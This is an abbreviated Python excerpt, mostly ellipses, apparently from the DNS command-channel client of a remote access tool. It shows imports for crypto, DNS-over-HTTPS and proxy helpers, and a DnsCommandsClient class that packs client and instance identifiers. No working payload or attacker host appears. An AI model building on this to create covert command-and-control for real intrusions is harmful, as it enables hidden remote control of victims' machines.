...
from ghost.network.lib.transports.cryptoutils import ECPV, get_random
...
from .picocmd import (
    ...
    OnlineStatusRequest, GhostState,
...
from ghost.network.lib import tinyhttp
from ghost.network.lib import online
from ghost.network.lib import doh as securedns
from ghost.network.lib import Proxy
...
class DnsCommandsClient(Thread):
    ...
    def _q_page_encoder(self, data):
        ...
        if CLIENT_VERSION > 1:
            node_block = b''.join((
                ...
                struct.pack(
                    '>BIH',
                    CLIENT_VERSION, ghost.client.cid, self.iid
                ),
    ...
    def run(self):
        ghost.set_broadcast_event(self._broadcast_event)
        ...
        ghost.set_broadcast_event(None)
